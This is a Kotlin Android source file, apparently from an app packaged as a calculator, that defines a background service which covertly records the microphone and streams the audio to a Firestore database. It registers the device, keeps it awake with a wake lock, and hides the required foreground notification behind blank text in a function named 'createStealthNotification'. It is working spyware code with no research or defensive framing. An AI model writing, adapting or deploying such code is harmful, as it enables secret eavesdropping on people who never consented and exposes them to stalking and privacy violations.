package com.dp.calculator

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream

class AudioService : Service() {

    companion object {
        const val ACTION_START = "ACTION_START"
        const val ACTION_STOP = "ACTION_STOP"
        private const val TAG = "AudioService"
        private const val NOTIFICATION_ID = 9999
        private const val CHANNEL_ID = "background_service"
        private const val SAMPLE_RATE = 8000
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_8BIT
        private const val CHUNK_SIZE = 4096
    }

    private var audioRecord: AudioRecord? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isStreaming = false
    private val firestore = FirebaseFirestore.getInstance()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> startStreaming()
            ACTION_STOP -> stopStreaming()
        }
        return START_STICKY
    }

    private fun startStreaming() {
        if (isStreaming) return

        serviceScope.launch {
            try {
                acquireWakeLock()
                startForeground(NOTIFICATION_ID, createStealthNotification())
                registerDevice()
                startAudioCapture()
                isStreaming = true
                Log.d(TAG, "Streaming started")
            } catch (e: Exception) {
                Log.e(TAG, "Error starting streaming", e)
                stopStreaming()
            }
        }
    }

    private fun stopStreaming() {
        isStreaming = false
        audioRecord?.release()
        audioRecord = null
        releaseWakeLock()
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
        Log.d(TAG, "Streaming stopped")
    }

    private fun registerDevice() {
        val deviceId = DeviceRegistrar.getDeviceId(this)
        val deviceData = hashMapOf(
            "deviceId" to deviceId,
            "status" to "online",
            "timestamp" to System.currentTimeMillis()
        )
        firestore.collection("devices").document(deviceId).set(deviceData)
    }

    private fun startAudioCapture() {
        val bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)

        audioRecord = AudioRecord(
            MediaRecorder.AudioSource.MIC,
            SAMPLE_RATE,
            CHANNEL_CONFIG,
            AUDIO_FORMAT,
            bufferSize
        )

        audioRecord?.startRecording()

        val deviceId = DeviceRegistrar.getDeviceId(this)
        val outputStream = ByteArrayOutputStream()

        serviceScope.launch(Dispatchers.IO) {
            val buffer = ByteArray(CHUNK_SIZE)
            var chunkCount = 0

            while (isStreaming && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                val bytesRead = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                if (bytesRead > 0) {
                    outputStream.write(buffer, 0, bytesRead)
                    chunkCount++

                    if (chunkCount % 10 == 0) {
                        val audioData = outputStream.toByteArray()
                        val base64Audio = Base64.encodeToString(audioData, Base64.NO_WRAP)

                        val audioChunk = hashMapOf(
                            "deviceId" to deviceId,
                            "audio" to base64Audio,
                            "timestamp" to System.currentTimeMillis(),
                            "chunkId" to chunkCount
                        )

                        firestore.collection("audio_stream")
                            .document(deviceId)
                            .set(audioChunk)

                        outputStream.reset()
                    }
                }
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Background Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createStealthNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSilent(true)
            .setOngoing(true)
            .build()
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "CalcService::WakeLock").apply {
            acquire(60 * 60 * 1000L)
        }
    }

    private fun releaseWakeLock() {
        wakeLock?.let { if (it.isHeld) it.release() }
        wakeLock = null
    }

    override fun onDestroy() {
        stopStreaming()
        serviceScope.cancel()
        super.onDestroy()
    }
}
